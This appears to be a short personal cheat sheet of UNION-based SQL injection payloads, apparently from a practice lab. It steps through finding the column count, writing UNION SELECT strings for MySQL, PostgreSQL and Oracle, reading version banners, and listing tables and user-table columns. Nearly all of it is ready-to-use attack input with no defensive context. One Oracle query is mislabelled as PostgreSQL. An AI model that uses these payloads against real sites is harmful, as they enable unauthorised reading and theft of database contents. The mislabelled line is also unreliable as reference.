# 1. read how many columns

' order by 1,2 --+-

enum until it shows error so how many columns are the number before error (for example i got 2 column)

# 2. UNION SELECT
' union select 1,2 --+- (mysql)
' union select null,null --+- (postgre)
' union select null,null from dual--+- (oracle)

# 3. Read data, and stuffs

' union select version(),2 --+- (mysql)
' union select version(),null --+- (postgre)
' union select banner,null from v$version--+-

# 4. dump all tables

' UNION SELECT table_name,NULL FROM all_tables-- (postgre)

' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- (mysql)

# 5. read specific table structure

' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_sfbljr' AND table_schema=database()-- (mysql)

' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_SFBLJR'-- (oracle)
